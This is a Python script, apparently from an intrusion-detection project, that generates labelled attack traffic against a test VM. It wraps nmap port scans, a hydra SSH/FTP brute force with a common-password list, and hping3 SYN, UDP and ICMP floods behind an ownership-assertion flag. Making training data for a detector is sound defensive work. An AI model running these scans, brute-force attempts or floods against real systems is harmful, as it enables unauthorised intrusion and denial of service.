#!/usr/bin/env python3
"""
generate_attack_traffic.py — Generate controlled attack traffic against a test VM
for creating positive (attack) training examples.

WARNING: This script runs ACTUAL network attacks (port scans, brute-force attempts,
flood tests). You MUST only run this against machines you OWN or have explicit
written permission to test. Running this against systems you don't own is ILLEGAL.

Required: --i-own-this-target flag must be passed to run any attack function.
"""

import argparse
import subprocess
import sys
import time
import warnings


# ---------------------------------------------------------------------------
# Safety guard
# ---------------------------------------------------------------------------

def require_ownership_flag(args):
    """Enforce the --i-own-this-target flag before any attack."""
    if not args.i_own_this_target:
        print("=" * 60)
        print("  SAFETY CHECK FAILED")
        print("  You must pass --i-own-this-target to run attacks.")
        print("  This flag confirms you own or have explicit written")
        print("  permission to test the target machine.")
        print("  Attacks are ILLEGAL against unauthorized targets.")
        print("=" * 60)
        sys.exit(1)

    print()
    print("*" * 60)
    print("  CONFIRMED: You have asserted ownership/authorization")
    print(f"  Target: {args.target}")
    print("  All attacks will be logged.")
    print("*" * 60)
    print()


# ---------------------------------------------------------------------------
# Attack functions
# ---------------------------------------------------------------------------

def run_nmap_scans(target: str, interface: str = None, output_dir: str = "attack_captures"):
    """
    Run nmap scans to generate port_scan training examples.

    Scans performed:
    1. SYN scan (-sS) — half-open, fast, most common recon technique
    2. Connect scan (-sT) — full TCP connect, slower but reliable
    3. Service version scan (-sV) — identifies services on open ports

    All scans target common ports first, then extended range.
    """
    print(f"[PORT SCAN] Starting nmap scans against {target}")
    print(f"  Generates 'port_scan' labeled training examples.")
    print()

    scan_configs = [
        {
            "name": "syn_scan_top100",
            "args": ["-sS", "-T4", "--top-ports", "100", "--open", target],
            "desc": "SYN scan of top 100 ports",
        },
        {
            "name": "connect_scan_common",
            "args": ["-sT", "-T3", "-p", "21,22,23,25,53,80,110,143,443,993,995,3389,3306,5432,8080,8443", target],
            "desc": "Connect scan of common service ports",
        },
        {
            "name": "service_version",
            "args": ["-sV", "-T3", "--top-ports", "50", target],
            "desc": "Service version detection on top 50 ports",
        },
        {
            "name": "full_port_scan",
            "args": ["-sS", "-T5", "-p-", "--min-rate", "1000", target],
            "desc": "Full port range SYN scan (1-65535)",
        },
    ]

    for config in scan_configs:
        print(f"  [+] Running: {config['desc']}")
        cmd = ["nmap"] + config["args"]
        if interface:
            cmd.extend(["-e", interface])

        # Output XML for later parsing
        xml_output = f"{output_dir}/{config['name']}.xml"
        cmd.extend(["-oX", xml_output])

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=300
            )
            if result.returncode == 0:
                print(f"      Completed successfully. Output: {xml_output}")
            else:
                print(f"      Warning: nmap returned code {result.returncode}")
                if result.stderr:
                    print(f"      {result.stderr.strip()[:200]}")
        except FileNotFoundError:
            print("      [!] nmap not found. Install nmap and try again.")
            print("          Windows: https://nmap.org/download.html")
            print("          Linux:   sudo apt install nmap")
            return
        except subprocess.TimeoutExpired:
            print(f"      [!] Scan timed out after 300s")

        time.sleep(1)  # Brief pause between scans

    print(f"[PORT SCAN] All scans complete. Capture traffic on the target")
    print(f"            with Cyberforecaster while running these for best labels.")


def run_brute_force(target: str, interface: str = None,
                    service: str = "ssh", output_dir: str = "attack_captures"):
    """
    Run hydra brute-force attempts to generate brute_force training examples.

    Targets a test SSH or FTP service with common credential wordlists.
    Create a test service with known credentials for safety:
      - SSH: testuser / password123
      - FTP: testuser / ftp123

    Hydra will attempt many wrong passwords before finding the right one,
    generating plenty of brute_force labeled flows.
    """
    print(f"[BRUTE FORCE] Starting hydra brute-force against {target}:{service}")
    print(f"  Generates 'brute_force' labeled training examples.")
    print()
    print("  NOTE: This targets a TEST service you control.")
    print("  Set up a test VM with known credentials for safety.")
    print()

    # Small wordlist of common test passwords (NOT a real wordlist)
    # These are the "wrong" passwords hydra will try
    test_passwords = [
        "admin", "root", "password", "123456", "test",
        "letmein", "welcome", "monkey", "dragon", "master",
        "qwerty", "login", "abc123", "iloveyou", "111111",
        "trustno1", "shadow", "michael", "superman", "696969",
        "passw0rd", "hello", "charlie", "donald", "password1",
    ]

    # Write temporary wordlist
    wordlist_path = f"{output_dir}/hydra_wordlist.txt"
    with open(wordlist_path, 'w') as f:
        for pwd in test_passwords:
            f.write(pwd + '\n')
    # Add correct password at end
    with open(wordlist_path, 'a') as f:
        f.write("password123\n")  # The "real" password

    service_configs = {
        "ssh": {
            "module": "ssh",
            "port": 22,
            "username": "testuser",
        },
        "ftp": {
            "module": "ftp",
            "port": 21,
            "username": "testuser",
        },
    }

    if service not in service_configs:
        print(f"  [!] Unknown service: {service}")
        print(f"      Supported: {', '.join(service_configs.keys())}")
        return

    cfg = service_configs[service]

    cmd = [
        "hydra",
        "-l", cfg["username"],
        "-P", wordlist_path,
        "-s", str(cfg["port"]),
        "-t", "4",  # 4 parallel tasks (gentle on test target)
        "-vV",      # Verbose output
        "-o", f"{output_dir}/hydra_results.txt",
        target,
        cfg["module"],
    ]

    try:
        print(f"  [+] Running hydra against {service} on port {cfg['port']}")
        print(f"      Username: {cfg['username']}")
        print(f"      Wordlist: {wordlist_path} ({len(test_passwords)+1} passwords)")
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=120
        )
        print(f"      Hydra completed. Results: {output_dir}/hydra_results.txt")
    except FileNotFoundError:
        print("      [!] hydra not found. Install hydra and try again.")
        print("          Windows: compile from source or use WSL")
        print("          Linux:   sudo apt install hydra")
        return
    except subprocess.TimeoutExpired:
        print(f"      [!] Hydra timed out after 120s")


def run_flood_test(target: str, interface: str = None,
                   duration: int = 10, output_dir: str = "attack_captures"):
    """
    Run hping3 flood tests to generate dos_ddos training examples.

    Performs controlled, short-duration floods:
    1. SYN flood — classic DoS technique
    2. UDP flood — volumetric attack
    3. ICMP flood — ping flood

    Duration is kept short (10s default) to minimize impact on test target.
    """
    print(f"[DoS/DDoS] Starting hping3 flood tests against {target}")
    print(f"  Generates 'dos_ddos' labeled training examples.")
    print(f"  Duration: {duration}s per flood type")
    print()

    flood_configs = [
        {
            "name": "syn_flood",
            "args": ["-S", "--flood", "-p", "80"],
            "desc": "SYN flood on port 80",
        },
        {
            "name": "udp_flood",
            "args": ["-2", "--flood", "-p", "53"],
            "desc": "UDP flood on port 53",
        },
        {
            "name": "icmp_flood",
            "args": ["--icmp", "--flood"],
            "desc": "ICMP (ping) flood",
        },
    ]

    for config in flood_configs:
        print(f"  [+] Running: {config['desc']} for {duration}s")
        cmd = ["hping3", "-c", str(duration * 1000)] + config["args"] + [target]

        if interface:
            cmd.extend(["-I", interface])

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=duration + 10
            )
            print(f"      Flood complete.")
            if result.stdout:
                # Print last few lines of hping3 output (stats)
                lines = result.stdout.strip().split('\n')
                for line in lines[-5:]:
                    print(f"      {line}")
        except FileNotFoundError:
            print("      [!] hping3 not found. Install hping3 and try again.")
            print("          Linux:   sudo apt install hping3")
            print("          Windows: not natively available; use WSL or Linux VM")
            return
        except subprocess.TimeoutExpired:
            print(f"      [!] Flood timed out")

        time.sleep(2)  # Pause between floods

    print(f"[DoS/DDoS] All flood tests complete.")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Generate controlled attack traffic for ML training data.",
        epilog="ALL ATTACKS must target machines you OWN or have written "
               "permission to test. The --i-own-this-target flag is REQUIRED."
    )
    parser.add_argument(
        "target",
        help="Target IP address of your test VM (e.g., 192.168.1.50)"
    )
    parser.add_argument(
        "--i-own-this-target", action="store_true",
        required=True,
        help="REQUIRED: Assert you own or have authorization to attack the target. "
             "Without this flag, no attacks will run."
    )
    parser.add_argument(
        "--interface", default=None,
        help="Network interface to send from (optional, nmap/hping3 -e)"
    )
    parser.add_argument(
        "--attack", choices=["scan", "brute", "flood", "all"],
        default="all",
        help="Which attack type to run (default: all)"
    )
    parser.add_argument(
        "--service", choices=["ssh", "ftp"], default="ssh",
        help="Service for brute-force tests (default: ssh)"
    )
    parser.add_argument(
        "--flood-duration", type=int, default=10,
        help="Duration in seconds for flood tests (default: 10)"
    )
    parser.add_argument(
        "--output-dir", default="attack_captures",
        help="Directory for output files (default: attack_captures)"
    )

    args = parser.parse_args()

    # Safety check
    require_ownership_flag(args)

    # Create output directory
    import os
    os.makedirs(args.output_dir, exist_ok=True)

    # Run requested attacks
    if args.attack in ("scan", "all"):
        run_nmap_scans(args.target, args.interface, args.output_dir)
        print()

    if args.attack in ("brute", "all"):
        run_brute_force(args.target, args.interface, args.service,
                        args.output_dir)
        print()

    if args.attack in ("flood", "all"):
        run_flood_test(args.target, args.interface, args.flood_duration,
                       args.output_dir)
        print()

    print("=" * 60)
    print("  ATTACK TRAFFIC GENERATION COMPLETE")
    print()
    print("  Next steps:")
    print("  1. Keep Cyberforecaster capture running on your interface")
    print("  2. Run labeling/generate_labels.py to correlate with Snort")
    print("  3. The labeled CSV will be your training data")
    print("=" * 60)


if __name__ == "__main__":
    main()
